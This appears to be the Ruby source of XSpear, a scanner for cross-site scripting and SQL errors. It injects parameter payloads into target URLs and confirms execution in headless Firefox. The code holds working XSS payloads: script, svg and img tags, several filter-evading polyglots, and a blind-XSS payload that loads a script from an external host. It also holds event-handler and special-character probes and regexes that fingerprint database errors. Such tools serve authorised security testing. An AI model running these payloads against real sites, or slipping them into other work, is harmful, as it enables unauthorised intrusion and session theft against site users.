require "XSpear/version"
require "XSpear/banner"
require "XSpear/log"
require "XSpear/XSpearRepoter"
require 'net/http'
require 'uri'
require 'optparse'
require 'colorize'
require "selenium-webdriver"

module XSpear
  class Error < StandardError; end
end

class XspearScan
  def initialize(url, data, headers, params, thread, output, verbose, blind)
    @url = url
    @data = data
    @headers = headers
    if params.nil?
      @params = params
    else
      @params = params.split(",")
    end
    @thread = thread
    @output = output
    @verbose = verbose
    @blind_url = blind
    @report = XspearRepoter.new @url, Time.now
    @filtered_objects = {}
  end

  class ScanCallbackFunc
    def initialize(url, method, query, response)
      @url = url
      @method = method
      @query = query
      @response = response
      # self.run
    end

    def run
      # Override callback function..

      # return type: Array(state, message)
      # + state: i(INFO), v(VULN), s(SYSTEM)
      # + message: your message

      # e.g
      # return "v", "reflected xss with #{query}"
    end
  end

  class CallbackStringMatch < ScanCallbackFunc
    def run
      if @response.body.include? @query
        [true, "reflected #{@query}"]
      else
        [false, "not reflected #{@query}"]
      end
    end
  end

  class CallbackNotAdded < ScanCallbackFunc
    def run
      if @response.body.include? @query
        log("i","reflected #{@query}")
        [false, true]
      else
        [false, false]
      end
    end
  end

  class CallbackErrorPatternMatch < ScanCallbackFunc
    def run
      info = "Found"
      if @response.body.to_s.match(/(SQL syntax.*MySQL|Warning.*mysql_.*|MySqlException \(0x|valid MySQL result|check the manual that corresponds to your (MySQL|MariaDB) server version|MySqlClient\.|com\.mysql\.jdbc\.exceptions)/i)
        info = info + "MYSQL "
      end
      if @response.body.to_s.match(/(Driver.* SQL[\-\_\ ]*Server|OLE DB.* SQL Server|\bSQL Server.*Driver|Warning.*mssql_.*|\bSQL Server.*[0-9a-fA-F]{8}|[\s\S]Exception.*\WSystem\.Data\.SqlClient\.|[\s\S]Exception.*\WRoadhouse\.Cms\.|Microsoft SQL Native Client.*[0-9a-fA-F]{8})/i)
        info = info + "MSSQL "
      end
      if @response.body.to_s.match(/(\bORA-\d{5}|Oracle error|Oracle.*Driver|Warning.*\Woci_.*|Warning.*\Wora_.*)/i)
        info = info + "Oracle "
      end
      if @response.body.to_s.match(/(PostgreSQL.*ERROR|Warning.*\Wpg_.*|valid PostgreSQL result|Npgsql\.|PG::SyntaxError:|org\.postgresql\.util\.PSQLException|ERROR:\s\ssyntax error at or near)/i)
        info = info + "Postgres "
      end
      if @response.body.to_s.match(/(Microsoft Access (\d+ )?Driver|JET Database Engine|Access Database Engine|ODBC Microsoft Access)/i)
        info = info + "MSAccess "
      end
      if @response.body.to_s.match(/(SQLite\/JDBCDriver|SQLite.Exception|System.Data.SQLite.SQLiteException|Warning.*sqlite_.*|Warning.*SQLite3::|\[SQLITE_ERROR\])/i)
        info = info + "SQLite "
      end
      if @response.body.to_s.match(/(Warning.*sybase.*|Sybase message|Sybase.*Server message.*|SybSQLException|com\.sybase\.jdbc)/i)
        info = info + "SyBase "
      end
      if @response.body.to_s.match(/(Warning.*ingres_|Ingres SQLSTATE|Ingres\W.*Driver)/i)
        info = info + "Ingress "
      end

      if info.length > 5
        [true, "#{@info}"]
      else
        [false, "#{@info}"]
      end
    end
  end

  class CallbackXSSSelenium < ScanCallbackFunc
    def run
      begin
      options = Selenium::WebDriver::Firefox::Options.new(args: ['-headless'])
      driver = Selenium::WebDriver.for(:firefox, options: options)
      if @method == "GET"
        begin
          driver.get(@url+"?"+@query)
          alert = driver.switch_to().alert()
          if alert.text.to_s == "45"
            driver.quit
            return [true, "found alert/prompt/confirm (45) in selenium!! #{@query}\n               => "]
          else
            driver.quit
            return [true, "found alert/prompt/confirm event in selenium #{@query}\n               =>"]
          end
        rescue Selenium::WebDriver::Error::UnexpectedAlertOpenError => e
          driver.quit
          return [true, "found alert/prompt/confirm error base in selenium #{@query}\n               =>"]
        rescue => e
          driver.quit
          return [false, "not found alert/prompt/confirm event #{@query}\n               =>"]
        end
      end
    rescue => e
      log('s', "Error Selenium : #{e}")
    end
    end
  end


  def run
    r = []
    event_handler = [
        'onAbort',
        'onActivate',
        'onAfterPrint',
        'onAfterUpdate',
        'onBeforeActivate',
        'onBeforeCopy',
        'onBeforeCut',
        'onBeforeDeactivate',
        'onBeforeEditFocus',
        'onBeforePaste',
        'onBeforePrint',
        'onBeforeUnload',
        'onBeforeUpdate',
        'onBegin',
        'onBlur',
        'onBounce',
        'onCellChange',
        'onChange',
        'onClick',
        'onContextMenu',
        'onControlSelect',
        'onCopy',
        'onCut',
        'onDataAvailable',
        'onDataSetChanged',
        'onDataSetComplete',
        'onDblClick',
        'onDeactivate',
        'onDrag',
        'onDragEnd',
        'onDragLeave',
        'onDragEnter',
        'onDragOver',
        'onDragDrop',
        'onDragStart',
        'onDrop',
        'onEnd',
        'onError',
        'onErrorUpdate',
        'onFilterChange',
        'onFinish',
        'onFocus',
        'onFocusIn',
        'onFocusOut',
        'onHashChange',
        'onHelp',
        'onInput',
        'onKeyDown',
        'onKeyPress',
        'onKeyUp',
        'onLayoutComplete',
        'onLoad',
        'onLoseCapture',
        'onMediaComplete',
        'onMediaError',
        'onMessage',
        'onMouseDown',
        'onMouseEnter',
        'onMouseLeave',
        'onMouseMove',
        'onMouseOut',
        'onMouseOver',
        'onMouseUp',
        'onMouseWheel',
        'onMove',
        'onMoveEnd',
        'onMoveStart',
        'onOffline',
        'onOnline',
        'onOutOfSync',
        'onPaste',
        'onPause',
        'onPopState',
        'onProgress',
        'onPropertyChange',
        'onReadyStateChange',
        'onRedo',
        'onRepeat',
        'onReset',
        'onResize',
        'onResizeEnd',
        'onResizeStart',
        'onResume',
        'onReverse',
        'onRowsEnter',
        'onRowExit',
        'onRowDelete',
        'onRowInserted',
        'onScroll',
        'onSeek',
        'onSelect',
        'onSelectionChange',
        'onSelectStart',
        'onStart',
        'onStop',
        'onStorage',
        'onSyncRestored',
        'onSubmit',
        'onTimeError',
        'onTrackChange',
        'onUndo',
        'onUnload',
        'onURLFlip'
    ]
    tags = [
        "script",
        "iframe"
    ]
    special_chars =[
        ">",
        "<",
        '"',
        "'",
        "`",
        ";",
        "|",
        "(",
        ")",
        "{",
        "}",
        "[",
        "]",
        ":",
        ".",
        ",",
        "+",
        "-",
        "=",
        "$"
    ]

    log('s', 'creating a test query.')
    r.push makeQueryPattern('d', 'XsPeaR"', 'XsPeaR"', 'i', "Found SQL Error Pattern", CallbackErrorPatternMatch)
    r.push makeQueryPattern('r', 'rEfe6', 'rEfe6', 'i', 'reflected parameter', CallbackStringMatch)
    # Check Special Char
    special_chars.each do |sc|
      r.push makeQueryPattern('f', "XsPeaR#{sc}>", "XsPeaR#{sc}", 'i', "not filtered "+"#{sc}".blue, CallbackNotAdded)
    end

    # Check Event Handler
    r.push makeQueryPattern('f', '\"><xspear onhwul=64>', 'onhwul=64', 'i', "not filtered event handler "+"on{any} pattern".blue, CallbackStringMatch)
    event_handler.each do |ev|
      r.push makeQueryPattern('f', "\"<xspear #{ev}=64>", "#{ev}=64", 'i', "not filtered event handler "+"#{ev}=64".blue, CallbackNotAdded)
    end

    # Check HTML Tag
    tags.each do |tag|
      r.push makeQueryPattern('f', "\">xsp<#{tag}>", "xsp<#{tag}>", 'i', "not filtered "+"<#{tag}>".blue, CallbackNotAdded)
    end

    # Check Common XSS Payloads
    r.push makeQueryPattern('x', '"><script>alert(45)</script>', '<script>alert(45)</script>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
    r.push makeQueryPattern('x', '<svg/onload=alert(45)>', '<svg/onload=alert(45)>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
    r.push makeQueryPattern('x', '<img/src onerror=alert(45)>', '<img/src onerror=alert(45)>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
    r.push makeQueryPattern('x', '"><iframe/src=JavaScriPt:alert(45)>', '"><iframe/src=JavaScriPt:alert(45)>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
    r.push makeQueryPattern('x', '"><script>alert(45)</script>', '<script>alert(45)</script>', 'v', "triggered "+"<script>alert(45)</script>".red, CallbackXSSSelenium)
    r.push makeQueryPattern('x', '<xmp><p title="</xmp><svg/onload=alert(45)>">', '<xmp><p title="</xmp><svg/onload=alert(45)>">', 'v', "triggered "+"<xmp><p title='</xmp><svg/onload=alert(45)>'>".red, CallbackXSSSelenium)
    r.push makeQueryPattern('x', '\'"><svg/onload=alert(45)>', '\'"><svg/onload=alert(45)>', 'v', "triggered "+"<svg/onload=alert(45)>".red, CallbackXSSSelenium)
    r.push makeQueryPattern('x', 'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert(45) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(45)//>\x3e', '\'"><svg/onload=alert(45)>', 'v', "triggered "+"XSS Polyglot payload".red, CallbackXSSSelenium)
    r.push makeQueryPattern('x', 'javascript:"/*`/*\"/*\' /*</stYle/</titLe/</teXtarEa/</nOscript></Script></noembed></select></template><FRAME/onload=/**/alert(45)//-->&lt;<sVg/onload=alert`45`>', '\'"><svg/onload=alert(45)>', 'v', "triggered "+"XSS Polyglot payload".red, CallbackXSSSelenium)
    r.push makeQueryPattern('x', 'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(45)//>', '\'"><svg/onload=alert(45)>', 'v', "triggered "+"XSS Polyglot payload".red, CallbackXSSSelenium)

    # Check Blind XSS Payload
    if !@blind_url.nil?
      payload = "<script src=#{@blind_url}></script>"
      r.push makeQueryPattern('f', "\"'>#{payload}", "NOTDETECTED", 'i', "", CallbackNotAdded)
    end

    r = r.flatten
    r = r.flatten
    log('s', "test query generation is complete. [#{r.length} query]")
    log('s', "starting test and analysis. [#{@thread} threads]")

    threads = []
    r.each_slice(@thread) do |jobs|
      jobs.map do |node|
        Thread.new do
          begin
          result, res = task(node[:query], node[:inject], node[:pattern], node[:callback])
          # p result.body
          if @verbose.to_i > 2
            log('d', "[#{res.code}] #{node[:query]} in #{node[:inject]} => #{result[1]}")
          end
          if result[0]
            log(node[:category], (result[1]).to_s.yellow+"[param: #{node[:param]}][#{node[:desc]}]")
            @report.add_issue(node[:category],node[:type],node[:param],node[:query],node[:pattern],node[:desc])
          elsif node[:callback] == CallbackNotAdded
            @filtered_objects[node[:param].to_s].nil? ? (@filtered_objects[node[:param].to_s] = [node[:pattern].to_s]) : (@filtered_objects[node[:param].to_s].push(node[:pattern].to_s))
          else
            log('d', (result[1]).to_s)
          end
          rescue => e
          end
        end
      end.each(&:join)
    end

    @report.set_filtered @filtered_objects
    @report.set_endtime
    log('s', "finish scan. the report is being generated..")
    if @output == 'json'
      puts @report.to_json
    else
      @report.to_cli
    end
  end

  def makeQueryPattern(type, payload, pattern, category, desc, callback)
    # type: [r]eflected param
    #       [f]ilted rule
    #       [x]ss
    #       [s]tatic
    #       [d]ynamic

    result = []
    if type == 's'
      result.push("inject": 'url',"param":"STATIC" ,"type": type, "query": @url, "pattern": pattern, "desc": desc, "category": category, "callback": callback)
      unless @data.nil?
        result.push("inject": 'body',"param":"STATIC" ,"type": type, "query": @url, "pattern": pattern, "desc": desc, "category": category, "callback": callback)
      end
      p result
    else
      uri = URI.parse(@url)
      begin
        params = URI.decode_www_form(uri.query)
        params.each do |p|
          if @params.nil? || (@params.include? p[0] if !@params.nil?)
            dparams = params
            dparams.each do |d|
              d[1] = p[1] + payload if p[0] == d[0]
            end
            result.push("inject": 'url',"param":p[0] ,"type": type, "query": URI.encode_www_form(dparams), "pattern": pattern, "desc": desc, "category": category, "callback": callback)
          end
        end
        unless @data.nil?
          params = URI.decode_www_form(@data)
          params.each do |p|
            if @params.nil? || (@params.include? p[0] if !@params.nil?)
              dparams = params
              dparams.each do |d|
                d[1] = p[1] + payload if p[0] == d[0]
              end
              result.push("inject": 'body', "param":p[0], "type": type, "query": URI.encode_www_form(dparams), "pattern": pattern, "desc": desc, "category": category, "callback": callback)
            end
          end
        end
      rescue StandardError
        result.push("inject": 'url',"param":"error", "type": type, "query": '', "pattern": pattern, "desc": desc, "category": category, "callback": callback)
      end
      result
    end
  end


  def task(query, injected, pattern, callback)
    begin
      uri = URI.parse(@url)
      request = nil
      method = "GET"
      uri.query = query if injected == 'url'


      if @data.nil?
        # GET
        request = Net::HTTP::Get.new(uri.request_uri)
      else
        # POST
        request = Net::HTTP::Post.new(uri.request_uri)
        request.body = query if injected == 'body'
        method = "POST"
      end


      Net::HTTP.start(uri.host, uri.port,
                      use_ssl: uri.scheme == 'https') do |http|

        request['Accept'] = '*/*'
        request['Connection'] = 'keep-alive'
        request['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0'
        unless @headers.nil?
          @headers.split(';').each do |header|
            begin
              c = header.split(': ')
              request[c[0]] = c[1] unless c.nil?
            rescue StandardError
              # pass
            end
          end
        end
        response = http.request(request)
        result = callback.new(uri.to_s, method, pattern, response).run
        # result = result.run
        # p request.headers
        return result, response
      end
    end
  rescue => e
    puts e
  end
end